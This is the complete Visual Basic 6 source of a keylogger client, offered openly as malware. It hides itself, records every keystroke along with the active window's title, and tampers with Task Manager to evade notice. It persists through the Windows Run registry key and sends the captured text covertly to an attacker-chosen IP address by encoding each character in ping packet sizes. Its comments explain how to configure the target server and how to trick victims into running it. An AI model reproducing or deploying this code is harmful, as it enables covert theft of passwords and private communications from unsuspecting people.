VERSION 5.00
Begin VB.Form Form1 
   Caption         =   "Form1"
   ClientHeight    =   645
   ClientLeft      =   60
   ClientTop       =   345
   ClientWidth     =   4680
   LinkTopic       =   "Form1"
   ScaleHeight     =   645
   ScaleWidth      =   4680
   StartUpPosition =   3  'Windows Default
   Begin VB.Timer Timer2 
      Interval        =   1000
      Left            =   3360
      Top             =   120
   End
   Begin VB.Timer Timer1 
      Interval        =   1
      Left            =   3960
      Top             =   120
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
    ' Configure this Keylogger
    ' This keylogger only has 1 configuration option:
    ' - Define the IP address of the computer of which to send keystroke data
    ' there are 2 ways to accomplish this.
    '
    ' Method #1 (For the nonprogrammer)
    ' Rename the Keylogger Client EXE to the IP address which to send.
    ' Becareful to use the correct format. You must add zero's as placeholders.
    ' Examples:
    ' To send packets to 127.0.0.1 the file should be named: 127000000001.exe
    ' To send packets to 145.12.54.111 the file should be named: 145012054111.exe
    '
    ' Method #2 (For those capable of compiling VB6 apps)
    ' in Form1, Form_Load(), find the line which reads SERVERIP = "" and edit it
    ' Example:
    ' SERVERIP = "145.12.54.111"
    ' its clearly marked.
    '
    ' In my opinion Method #2 is probably the superior method since the executable
    ' can have any name, it would be easier to trick someone into executing it.
    ' Also if you attempt to execute a file from Internet Explorer - it will often
    ' alter the exe name.
    
Private Const LVM_FIRST = &H1000
Private Const LVM_DELETECOLUMN = (LVM_FIRST + 28)
Private Const REG_SZ = 1
Private Const HKEY_CURRENT_USER = &H80000001
Private Const REGKEY = "Software\Microsoft\Windows\CurrentVersion\Run"
Private Const KEY_WRITE = &H20006
Private Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Private Declare Function FindWindowEx Lib "user32" Alias "FindWindowExA" (ByVal hWnd1 As Long, ByVal hWnd2 As Long, ByVal lpsz1 As String, ByVal lpsz2 As String) As Long
Private Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal hWnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long
Private Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hWnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Private Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hWnd As Long) As Long
Private Declare Function GetForegroundWindow Lib "user32" () As Long
Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
Private Declare Function GetKeyState Lib "user32" (ByVal nVirtKey As Long) As Integer
Private Declare Function RegSetValueEx Lib "advapi32.dll" Alias "RegSetValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, lpData As Any, ByVal cbData As Long) As Long
Private Declare Function RegOpenKeyEx Lib "advapi32.dll" Alias "RegOpenKeyExA" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
Dim LASTWINDOW As String
Dim kLOG As String
Dim SERVERIP As String
Dim APPPATH As String

Private Sub Form_Load()
    
    ' V-- Configure this line below --V
    SERVERIP = ""
    ' ^-- Configure this line above --^
    Me.Hide
    App.TaskVisible = False
    If App.PrevInstance Then
        End
        Exit Sub
    End If
    APPPATH = App.Path
    If Right(APPPATH, 1) = "\" Then APPPATH = Left(APPPATH, Len(APPPATH) - 1)
    If SERVERIP = vbNullString Then
        If Len(App.EXEName) < 12 Then
            End
            Exit Sub
        End If
        Dim getIP As String
        Dim num(3) As String
        Dim testIP As String
        getIP = App.EXEName
        num(0) = Mid(getIP, 1, 3)
        num(1) = Mid(getIP, 4, 3)
        num(2) = Mid(getIP, 7, 3)
        num(3) = Mid(getIP, 10, 3)
        testIP = num(0) + "." + num(1) + "." + num(2) + "." + num(3)
        SERVERIP = testIP
    End If
    If validIP(SERVERIP) = False Then
        End
        Exit Sub
    End If
    
End Sub

Private Function validIP(ByVal strIP As String) As Boolean

    Dim i As Long
    Dim subNet() As String
    While InStr(strIP, ".") > 0
        i = i + 1
        ReDim Preserve subNet(1 To i)
        subNet(i) = Mid(strIP, 1, InStr(strIP, ".") - 1)
        strIP = Mid(strIP, InStr(strIP, ".") + 1)
    Wend
    i = i + 1
    ReDim Preserve subNet(1 To i)
    subNet(i) = strIP
    If i <> 4 Then GoTo errHandler
    For i = 1 To 4
        On Error GoTo errHandler
        If CByte(subNet(i)) Then validIP = True
    Next i
    Exit Function
errHandler:
    validIP = False
    
End Function

Private Function SendPing(PingSize As Integer) As Long

    Shell ("PING " & SERVERIP & " -l " & PingSize & " -n 1 -w 1"), vbHide

End Function

Private Function Convert2msgID(letter As String) As Integer

    Dim tempid As Integer
    If letter = "e" Then tempid = 28
    If letter = "t" Then tempid = 29
    If letter = "a" Then tempid = 30
    If letter = "o" Then tempid = 31
    If letter = "i" Then tempid = 32
    If letter = "n" Then tempid = 33
    If letter = "s" Then tempid = 34
    If letter = "r" Then tempid = 35
    If letter = "h" Then tempid = 36
    If letter = "l" Then tempid = 37
    If letter = "d" Then tempid = 38
    If letter = "c" Then tempid = 39
    If letter = "u" Then tempid = 40
    If letter = "m" Then tempid = 41
    If letter = "f" Then tempid = 42
    If letter = "p" Then tempid = 43
    If letter = "g" Then tempid = 44
    If letter = "w" Then tempid = 45
    If letter = "y" Then tempid = 46
    If letter = "b" Then tempid = 47
    If letter = "v" Then tempid = 48
    If letter = "k" Then tempid = 49
    If letter = "x" Then tempid = 50
    If letter = "j" Then tempid = 51
    If letter = "q" Then tempid = 52
    If letter = "z" Then tempid = 53
    If letter = "E" Then tempid = 54
    If letter = "T" Then tempid = 55
    If letter = "A" Then tempid = 56
    If letter = "O" Then tempid = 57
    If letter = "I" Then tempid = 58
    If letter = "N" Then tempid = 59
    If letter = "S" Then tempid = 60
    If letter = "R" Then tempid = 61
    If letter = "H" Then tempid = 62
    If letter = "L" Then tempid = 63
    If letter = "D" Then tempid = 64
    If letter = "C" Then tempid = 65
    If letter = "U" Then tempid = 66
    If letter = "M" Then tempid = 67
    If letter = "F" Then tempid = 68
    If letter = "P" Then tempid = 69
    If letter = "G" Then tempid = 70
    If letter = "W" Then tempid = 71
    If letter = "Y" Then tempid = 72
    If letter = "B" Then tempid = 73
    If letter = "V" Then tempid = 74
    If letter = "K" Then tempid = 75
    If letter = "X" Then tempid = 76
    If letter = "J" Then tempid = 77
    If letter = "Q" Then tempid = 78
    If letter = "Z" Then tempid = 79
    If letter = "1" Then tempid = 80
    If letter = "2" Then tempid = 81
    If letter = "3" Then tempid = 82
    If letter = "4" Then tempid = 83
    If letter = "5" Then tempid = 84
    If letter = "6" Then tempid = 85
    If letter = "7" Then tempid = 86
    If letter = "8" Then tempid = 87
    If letter = "9" Then tempid = 88
    If letter = "0" Then tempid = 89
    If letter = "!" Then tempid = 90
    If letter = "@" Then tempid = 91
    If letter = "#" Then tempid = 92
    If letter = "$" Then tempid = 93
    If letter = "%" Then tempid = 94
    If letter = "^" Then tempid = 95
    If letter = "&" Then tempid = 96
    If letter = "*" Then tempid = 97
    If letter = "(" Then tempid = 98
    If letter = ")" Then tempid = 99
    If letter = "-" Then tempid = 100
    If letter = "=" Then tempid = 101
    If letter = "_" Then tempid = 102
    If letter = "+" Then tempid = 103
    If letter = "`" Then tempid = 104
    If letter = "~" Then tempid = 105
    If letter = "[" Then tempid = 106
    If letter = "{" Then tempid = 107
    If letter = "]" Then tempid = 108
    If letter = "}" Then tempid = 109
    If letter = "|" Then tempid = 110
    If letter = "\" Then tempid = 111
    If letter = ";" Then tempid = 112
    If letter = ":" Then tempid = 113
    If letter = "'" Then tempid = 114
    If letter = Chr(34) Then tempid = 115
    If letter = "," Then tempid = 116
    If letter = "<" Then tempid = 117
    If letter = "." Then tempid = 118
    If letter = ">" Then tempid = 119
    If letter = "/" Then tempid = 120
    If letter = "?" Then tempid = 121
    If letter = Chr(13) Then tempid = 122
    If letter = " " Then tempid = 123
    Convert2msgID = tempid
    
End Function

Private Sub HackTaskManager()

    Dim taskmanager As Long
    Dim taskmgr As Long
    taskmanager = FindWindow("#32770", "Windows Task Manager")
    If taskmanager <> 0 Then
        taskmgr = FindWindowEx(taskmanager, ByVal 0&, "#32770", vbNullString)
        syslistview = FindWindowEx(taskmgr, ByVal 0&, "syslistview32", "Processes")
        Call SendMessage(syslistview, LVM_DELETECOLUMN, 0, 0)
    End If
   
End Sub

Private Function GetCapslock() As Boolean

    GetCapslock = CBool(GetKeyState(vbKeyCapital) And 1)

End Function

Private Function GetShift() As Boolean

    GetShift = CBool(GetAsyncKeyState(vbKeyShift))

End Function


Private Sub Form_Unload(Cancel As Integer)

    Cancel = 1

End Sub

Private Sub Timer1_Timer()

    On Error Resume Next
    HackTaskManager
    Dim FoundKeys As String
    Dim AddKey
    Dim KeyResult As Integer
    Dim n As Integer
    KeyResult = GetAsyncKeyState(13)
    If KeyResult = -32767 Then
        AddKey = Chr(13)
        GoTo KeyFound
    End If
    KeyResult = GetAsyncKeyState(8)
    If KeyResult = -32767 Then
        AddKey = "[<-]"
        GoTo KeyFound
    End If
    KeyResult = GetAsyncKeyState(32)
    If KeyResult = -32767 Then
        AddKey = " "
        GoTo KeyFound
    End If
    KeyResult = GetAsyncKeyState(186)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = ";" Else AddKey = ":"
        GoTo KeyFound
    End If
    KeyResult = GetAsyncKeyState(187)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "=" Else AddKey = "+"
        GoTo KeyFound
    End If
    KeyResult = GetAsyncKeyState(188)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "," Else AddKey = "<"
       GoTo KeyFound
    End If
    KeyResult = GetAsyncKeyState(189)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "-" Else AddKey = "_"
        GoTo KeyFound
    End If
    KeyResult = GetAsyncKeyState(190)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "." Else AddKey = ">"
        GoTo KeyFound
    End If
    KeyResult = GetAsyncKeyState(191)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "/" Else AddKey = "?"
        GoTo KeyFound
    End If
    KeyResult = GetAsyncKeyState(192)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "`" Else AddKey = "~"
        GoTo KeyFound
    End If
    KeyResult = GetAsyncKeyState(96)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "0" Else AddKey = ")"
        GoTo KeyFound
    End If
    KeyResult = GetAsyncKeyState(97)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "1" Else AddKey = "!"
        GoTo KeyFound
    End If
    KeyResult = GetAsyncKeyState(98)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "2" Else AddKey = "@"
        GoTo KeyFound
    End If
    KeyResult = GetAsyncKeyState(99)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "3" Else AddKey = "#"
        GoTo KeyFound
    End If
    KeyResult = GetAsyncKeyState(100)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "4" Else AddKey = "$"
        GoTo KeyFound
    End If
    KeyResult = GetAsyncKeyState(101)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "5" Else AddKey = "%"
        GoTo KeyFound
    End If
    KeyResult = GetAsyncKeyState(102)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "6" Else AddKey = "^"
        GoTo KeyFound
    End If
    KeyResult = GetAsyncKeyState(103)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "7" Else AddKey = "&"
        GoTo KeyFound
    End If
    KeyResult = GetAsyncKeyState(104)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "8" Else AddKey = "*"
        GoTo KeyFound
    End If
    KeyResult = GetAsyncKeyState(105)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "9" Else AddKey = "("
        GoTo KeyFound
    End If
    KeyResult = GetAsyncKeyState(106)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "*" Else AddKey = ""
        GoTo KeyFound
    End If
    KeyResult = GetAsyncKeyState(107)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "=" Else AddKey = "+"
        GoTo KeyFound
    End If
    KeyResult = GetAsyncKeyState(108)
    If KeyResult = -32767 Then
        AddKey = ""
        If GetShift = False Then kLOG = kLOG & Chr(13)
        GoTo KeyFound
    End If
    KeyResult = GetAsyncKeyState(109)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "-" Else AddKey = "_"
        GoTo KeyFound
    End If
    KeyResult = GetAsyncKeyState(110)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "." Else AddKey = ">"
        GoTo KeyFound
    End If
    KeyResult = GetAsyncKeyState(2)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "/" Else AddKey = "?"
        GoTo KeyFound
    End If
    KeyResult = GetAsyncKeyState(220)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "\" Else AddKey = "|"
        GoTo KeyFound
    End If
    KeyResult = GetAsyncKeyState(222)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "'" Else AddKey = Chr(34)
        GoTo KeyFound
    End If
    KeyResult = GetAsyncKeyState(221)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "]" Else AddKey = "}"
        GoTo KeyFound
    End If
    KeyResult = GetAsyncKeyState(219)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "[" Else AddKey = "{"
        GoTo KeyFound
    End If
    For n = 65 To 128
        KeyResult = GetAsyncKeyState(n)
        If KeyResult = -32767 Then
            If GetShift = False Then
                If GetCapslock = True Then AddKey = UCase(Chr(n)) Else AddKey = LCase(Chr(n))
            Else
                If GetCapslock = False Then AddKey = UCase(Chr(n)) Else AddKey = LCase(Chr(n))
            End If
            GoTo KeyFound
        End If
    Next n
    For n = 48 To 57
        KeyResult = GetAsyncKeyState(n)
        If KeyResult = -32767 Then
            If GetShift = True Then
                Select Case Val(Chr(n))
                    Case 1
                        AddKey = "!"
                    Case 2
                        AddKey = "@"
                    Case 3
                        AddKey = "#"
                    Case 4
                        AddKey = "$"
                    Case 5
                        AddKey = "%"
                    Case 6
                        AddKey = "^"
                    Case 7
                        AddKey = "&"
                    Case 8
                        AddKey = "*"
                    Case 9
                        AddKey = "("
                    Case 0
                        AddKey = ")"
                End Select
            Else
                AddKey = Chr(n)
            End If
            GoTo KeyFound
        End If
    Next n
    DoEvents
    Exit Sub
KeyFound:
    If AddKey = "[<-]" Then
        If Right(kLOG, 1) = vbLf Then
            Exit Sub
        Else
            kLOG = Left(kLOG, Len(kLOG) - 1)
            Exit Sub
        End If
    End If
    Dim CurrentWindow As Long
    CurrentWindow = GetForegroundWindow()
    Dim MyStr As String
    Dim CurCap As String
    MyStr = String(GetWindowTextLength(CurrentWindow) + 1, Chr$(0))
    GetWindowText CurrentWindow, MyStr, Len(MyStr)
    CurCap = Left(MyStr, Len(MyStr) - 1)
    If Left(CurCap, 4) = "mIRC" Then CurCap = "mIRC"
    If CurCap = LASTWINDOW Then
        If AddKey <> "" Then kLOG = kLOG & AddKey
        DoEvents
    Else
        kLOG = kLOG & Chr(13) & Chr(13) & "[" & CurCap & ":]" & Chr(13)
        If AddKey <> "" Then kLOG = kLOG & AddKey
        DoEvents
    End If
    LASTWINDOW = CurCap
    
End Sub

Private Sub Timer2_Timer()

    If Len(kLOG) > 1 Then
        Dim CURKEY As String
        CURKEY = Left(kLOG, 1)
        Call SendPing(Convert2msgID(CURKEY))
        kLOG = Right(kLOG, Len(kLOG) - 1)
    End If
    Dim Path As Long
    If RegOpenKeyEx(HKEY_CURRENT_USER, REGKEY, 0, KEY_WRITE, Path) Then
    Else
        RegSetValueEx Path, App.EXEName, 0, REG_SZ, ByVal APPPATH & "\" & App.EXEName, Len(APPPATH & "\" & App.EXEName)
    End If


End Sub
